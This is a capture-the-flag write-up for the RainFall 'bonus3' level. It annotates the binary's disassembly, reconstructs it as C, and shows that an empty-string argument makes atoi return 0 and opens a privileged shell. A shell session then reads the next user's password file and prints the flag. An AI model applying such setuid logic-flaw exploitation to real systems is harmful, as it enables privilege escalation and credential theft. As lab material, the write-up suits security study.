
### notes
```c
0x080484f4  main
```

### 0x08048529 : main() : disassembly
```c
{
    int argc = ebp+0x8
    char **argv = ebp+12
    char *flagFile = esp+156 // ~0x9c
    char *buffer[156 - 24=132] = esp+24
}
```
_**`<0> ==> <+8> : prepare stack frame for n function with size 160`**_
```c
0x080484f4 <+0>:	push   ebp
0x080484f5 <+1>:	mov    ebp,esp
0x080484f7 <+3>:	push   edi
0x080484f8 <+4>:	push   ebx
0x080484f9 <+5>:	and    esp,0xfffffff0
0x080484fc <+8>:	sub    esp,160 // ~0xa0
```
```c
0x08048502 <+14>:	mov    edx,0x80486f0 // "r"
0x08048507 <+19>:	mov    eax,0x80486f2 // "/home/user/end/.pass"
0x0804850c <+24>:	mov    DWORD PTR [esp+4],edx // param2 = "r"
0x08048510 <+28>:	mov    DWORD PTR [esp],eax // param1 = "/home/user/end/.pass"
0x08048513 <+31>:	call   0x8048410 <fopen@plt> // fopen("/home/user/end/.pass", "r")
0x08048518 <+36>:	mov    DWORD PTR [flagFile],eax
flagFile = fopen("/home/user/end/.pass", "r")
```
```c
0x0804851f <+43>:	lea    ebx,[buffer]
0x08048523 <+47>:	mov    eax,0
0x08048528 <+52>:	mov    edx,33
0x0804852d <+57>:	mov    edi,ebx
0x0804852f <+59>:	mov    ecx,edx
0x08048531 <+61>:	rep stos DWORD PTR es:[edi],eax
memset(buffer, 0, 132) ~ 132 = ecx * 4 = 33 * 4
```
```c
0x08048533 <+63>:	cmp    DWORD PTR [flagFile],0
0x0804853b <+71>:	je     0x8048543 <main+79>
if (flagFile == 0) jump to <main+79> (return -1)
```
```c
0x0804853d <+73>:	cmp    DWORD PTR [argc],2
0x08048541 <+77>:	je     0x804854d <main+89>
if (argc == 2) jump to <main+89>
```
```c
0x08048543 <+79>:	mov    eax,0xffffffff // (-1)
0x08048548 <+84>:	jmp    0x8048615 <main+289>
jump to <main+289> (return -1)
```
```c
0x0804854d <+89>:	lea    eax,[buffer]
0x08048551 <+93>:	mov    edx,DWORD PTR [flagFile]
0x08048558 <+100>:	mov    DWORD PTR [esp+12],edx
0x0804855c <+104>:	mov    DWORD PTR [esp+8],66
0x08048564 <+112>:	mov    DWORD PTR [esp+4],1
0x0804856c <+120>:	mov    DWORD PTR [esp],eax
0x0804856f <+123>:	call   0x80483d0 <fread@plt> 
fread(buffer, 1, 66, flagFile);
```
```c
0x08048574 <+128>:	mov    BYTE PTR [esp+89],0 // ~buffer[89-24]~buffer[65] = 0 
0x08048579 <+133>:	mov    eax,DWORD PTR [argv] // eax = argv
0x0804857c <+136>:	add    eax,4 // eax = argv[1]
0x0804857f <+139>:	mov    eax,DWORD PTR [eax] // = eax = *argv[1]
0x08048581 <+141>:	mov    DWORD PTR [esp],eax // esp = argv[1]
0x08048584 <+144>:	call   0x8048430 <atoi@plt> //eax = atoi(argv[1]) 

buffer[65] = 0 
eax = atoi(argv[1])
```
```c  
0x08048589 <+149>:	mov    BYTE PTR [esp+eax*1+24],0
[buffer+eax] ~ [buffer+atoi(argv[1])] => buffer[atoi(argv[1]] = 0
```
```c
0x0804858e <+154>:	lea    eax,[buffer]
0x08048592 <+158>:	lea    edx,[eax+66] // edx = buffer[66]
0x08048595 <+161>:	mov    eax,DWORD PTR [flagFile]
0x0804859c <+168>:	mov    DWORD PTR [esp+12],eax
0x080485a0 <+172>:	mov    DWORD PTR [esp+8],65
0x080485a8 <+180>:	mov    DWORD PTR [esp+4],1
0x080485b0 <+188>:	mov    DWORD PTR [esp],edx // esp = buffer[66]
0x080485b3 <+191>:	call   0x80483d0 <fread@plt>
fread(&buffer[66], 1, 65, flagFile);
```
```c
0x080485b8 <+196>:	mov    eax,DWORD PTR [flagFile]
0x080485bf <+203>:	mov    DWORD PTR [esp],eax // esp = flagFile
0x080485c2 <+206>:	call   0x80483c0 <fclose@plt>
fclose(flagFile);
```
```c
0x080485c7 <+211>:	mov    eax,DWORD PTR [argv]
0x080485ca <+214>:	add    eax,4 // eax = argv[1]
0x080485cd <+217>:	mov    eax,DWORD PTR [eax]
0x080485cf <+219>:	mov    DWORD PTR [esp+4],eax // param2 = argv[1]
0x080485d3 <+223>:	lea    eax,[buffer]
0x080485d7 <+227>:	mov    DWORD PTR [esp],eax // esp = buffer
0x080485da <+230>:	call   0x80483b0 <strcmp@plt> // strcmp(buffer, argv[1])
0x080485df <+235>:	test   eax,eax // eax == 0 ?
0x080485e1 <+237>:	jne    0x8048601 <main+269> // jump to +269 if not equal

eax = strcmp(buffer, argv[1])
if (eax != 0) jump to  <+269> ~ puts(buffer)
```
```c
0x080485e3 <+239>:	mov    DWORD PTR [esp+8],0 // param3 = 0
0x080485eb <+247>:	mov    DWORD PTR [esp+4],0x8048707 // param2 = "sh"
0x080485f3 <+255>:	mov    DWORD PTR [esp],0x804870a // param1 = "/bin/sh"
0x080485fa <+262>:	call   0x8048420 <execl@plt> // execl("/bin/sh", "sh", 0)
0x080485ff <+267>:	jmp    0x8048610 <main+284>

execl("/bin/sh", "sh", 0)
jump to return 0
```
```c
0x08048601 <+269>:	lea    eax,[buffer]
0x08048605 <+273>:	add    eax,66 // buffer[66]
0x08048608 <+276>:	mov    DWORD PTR [esp],eax // *esp = buffer[66] ~ esp = &buffer[66]
0x0804860b <+279>:	call   0x80483e0 <puts@plt> // puts(&buffer[66])
puts(&buffer[66])
```
```c
0x08048610 <+284>:	mov    eax,0
0x08048615 <+289>:	lea    esp,[ebp-8]
0x08048618 <+292>:	pop    ebx
0x08048619 <+293>:	pop    edi
0x0804861a <+294>:	pop    ebp
0x0804861b <+295>:	ret
return 0
```



### Code Prediction 
```c
int main(int argc(ebp+0x8), char **argv(ebp+12)) {

    char *flagFile = esp+156 // ~0x9c
    char *buffer[132] = esp+24 // ~0x18 
    // we know the size of the buffer by calculating the gap between the flagFile and buffer 0x9c-0x18 = 156-24 = 132

    flagFile = fopen("/home/user/end/.pass", "r")
    memset(buffer, 0, 132)

    if (flagFile == 0 || argc != 2) {
        return (-1);
    }

    if (argc == 2) {
        fread(buffer, 1, 66, flagFile);
        buffer[65] = 0 ;

        int nb = atoi(argv[1])
        buffer[nb] = 0;

        fread(&buffer[66], 1, 65, flagFile); 
        fclose(flagFile);

        if (strcmp(buffer, argv[1]) != 0) {
            puts(&buffer[66])   ;
        }
        else
            execl("/bin/sh", "sh", 0);
    }
    return (0);
}

```
### Process of the Exploit
the idea of the program is the following 
- call atoi with first param and put value in nb
- go to buffer and put \0 in the index nb (buffer[nb] = 0)
- compare buffer to param1 (as string)
- if equal execute shell

- so buffer[atoi(param1)] == param1
- when we send empty string to atoi it return 0
    >  atoi("") = 0

- result is this :
    ```c
    param1 = ""
    nb = atoi(param1)
    // nb == 0
    buffer[nb]= 0
    buffer[0] = 0
    // buffer == ""
    buffer == param1 ? yes
    ```

---
### Solution :

```shell
bonus3@RainFall:~$ ./bonus3 ""
$ pwd
/home/user/bonus3
$ whoami
end
$ cd /home/user/end  
$ ls -la
total 13
dr-xr-x---+ 1 end  end     80 Sep 23  2015 .
dr-x--x--x  1 root root   340 Sep 23  2015 ..
-rw-r--r--  1 end  end    220 Apr  3  2012 .bash_logout
-rw-r--r--  1 end  end   3489 Sep 23  2015 .bashrc
-rwsr-s---+ 1 end  users   26 Sep 23  2015 end
-r--r-----+ 1 end  end     65 Sep 23  2015 .pass
-rw-r--r--  1 end  end    675 Apr  3  2012 .profile
$ cat .pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ su end
Password: 
end@RainFall:~$ ls
end
end@RainFall:~$ cat end 
Congratulations graduate!
end@RainFall:~$ 
```

**`flag : 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`**|
---

 
